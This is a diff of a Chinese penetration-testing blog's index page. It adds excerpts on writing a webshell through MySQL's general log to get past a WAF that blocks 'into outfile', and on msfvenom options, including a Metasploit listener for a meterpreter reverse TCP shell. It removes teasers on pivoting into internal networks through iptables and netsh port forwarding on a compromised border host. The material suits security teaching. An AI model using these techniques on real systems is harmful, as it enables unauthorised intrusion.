@@ -139,6 +139,70 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/03/24/mysql-log-write-webshell/">
+                利用mysql的general log 写shell[突破into outfile]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webshell/">webshell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你</p>
+<p><img src="/img/show variables waf.png" alt=""><br><br>
+        </div>
+        <a href="/2017/03/24/mysql-log-write-webshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/03/08/msfvenom-advanced/">
+                msfvenom 进阶 [暂未完...]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-03-08</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/msfvenom/">msfvenom</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 msfvenom 常规选项用途:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">l  列出所有可用的payload,编码器,空指令……</span></div><div class="line">-<span class="ruby">p  指定要使用的msf的payload,也可以使用自定义payload,几乎是支持全平台的</span></div><div class="line">-<span class="ruby">f  指定payload输出的文件类型,--help-formats,可查看支持的所有输出格式</span></div><div class="line">-<span class="ruby">e  指定要使用那种编码器</span></div><div class="line">-<span class="ruby">i  指定编码的次数,如果使用编码器</span></div><div class="line">-<span class="ruby">b  指定坏字符,比如空字符截断问题,等等……</span></div><div class="line">-<span class="ruby">x  使用一个自定义可执行程序模板,并将payload嵌入其中</span></div><div class="line">-<span class="ruby">k  当模板被执行时,payload自动分离并注入到新的进程中,一般和-x选项一并使用</span></div><div class="line">-<span class="ruby">o  指定创建好的payload的存放位置</span></div></pre></td></tr></table></figure></p>
+<p>0x02 首先,创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler</div><div class="line">msf &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></div><div class="line">msf <span class="comment">&gt; set lport 443</span></div><div class="line">msf <span class="comment">&gt; set lhost 192.168.3.12</span></div><div class="line">msf <span class="comment">&gt; exploit -j</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/03/08/msfvenom-advanced/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/01/31/tcpdump-sniffer-pass/">
                 linux下的嗅探实践 [tcpdump篇]
             </a>
@@ -550,73 +614,6 @@
 <p>0x02 我们可以拿它来做什么<br>&nbsp;&nbsp;&nbsp;&nbsp;刚刚在上面已经说过,它并非直接转发,而是又自己建立了一个新的通道,这样的好处在哪里呢,很明显,我们可以通过这样的方式来轻松bypass掉各类应用层防火墙</p>
         </div>
         <a href="/2016/09/20/fpipe-redirect-port/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/19/iptables-portfward/">
-                通向彼岸 之内网代理转发 [ 系统篇 iptables ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/iptabbles/">iptabbles</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;作用和netsh差不多,这里就不废话了,直接看操作,还是同样的情况,只不过你此时拿下的是边界的一台linux服务器,依然想通过这台机器直接去访问内网的其它机器</p>
-<p>0x02 环境大致如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">边界linux机器(centos <span class="number">6.8</span>en) 		<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.40</span>(假设为目标机器的公网ip) <span class="number">192.168</span>.<span class="number">32.129</span>(假设为目标的内网ip) </div><div class="line">要访问的内网windows机器(win <span class="number">2008</span>r2cn) 	<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">32.134</span> </div><div class="line">攻击者机器(win7cn) 			<span class="symbol">ip:</span><span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
-<p>0x03 最终目的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过边界的linux机器访问内网中的windows机器上的指定服务</div></pre></td></tr></table></figure></p>
-<p>0x04 具体过程如下,首先,编辑边界linux机器的路由转发配置文件,开启其路由转发功能<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sed -i '/net.ipv4.ip_forward/ s/\(.*= \).*/\11/' /etc/sysctl.conf</span></div><div class="line"><span class="comment"># cat /etc/sysctl.conf | grep "net.ipv4.ip_forward"</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/19/iptables-portfward/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/18/netsh-portfward/">
-                通向彼岸 之内网代理转发 [ 系统篇 netsh ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/netsh/">netsh</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;除了前面提到的用一些端口转发工具来进行端口转发,其实windows系统自己也给我们提供了类似的功能,比如,其自带的防火墙管理工具<code>netsh</code>套件[确实非常实用],尤其碰到一些稍微畸形点的内网环境<br><br></p>
-<p>0x02 先来假设这么一种情况<br>&nbsp;&nbsp;&nbsp;&nbsp;当你搞定边界的一台windows机器以后,上去一看发现,机器上有两块网卡,一块外网卡,一块内网卡[先暂以正常的DMZ来讲],这时又你通过别的方式搞定了同内网的另一台windows机器,本来以为简单的种上马就可以走人了,但你发现马执行以后似乎什么都没发生,搞了半天,你才发现,原来这台内网机器根本不能连外网,说到这里,相必你也应该知道我要干啥了,没错,虽然内网的那台机器不能连外网,但它起码能跟边界的这台机器正常通信,这就够了,我们可以直接从外部通过边界这台机器来访问内网的那台不能连外网的机器<br><br><br>0x03 演示简单环境如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">目标的边界机器[win7en] 				<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.212</span>  [假设为目标公网ip] <span class="number">192.168</span>.<span class="number">32.132</span>[目标内网ip]</div><div class="line">目标内网的那台不能连外网的机器[win <span class="number">2008</span>r2cn] 	<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">32.134</span> [目标内网ip]</div><div class="line">外部的攻击者的机器[win7cn] 			<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.251</span></div></pre></td></tr></table></figure></p>
-<p>0x04 要实现的目的很简单:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">首先,可以确认的是,边界机器和攻击者机器通信正常,边界机器和目标内网的那台不能连外网的机器通信正常</div><div class="line">现在,我想通过边界机器的某个端口去访问目标内网的那台不能上外网的机器的<span class="number">3389</span>,下面是具体的操作步骤</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/18/netsh-portfward/" class="read-more">Read More</a>
     
 
 </div>
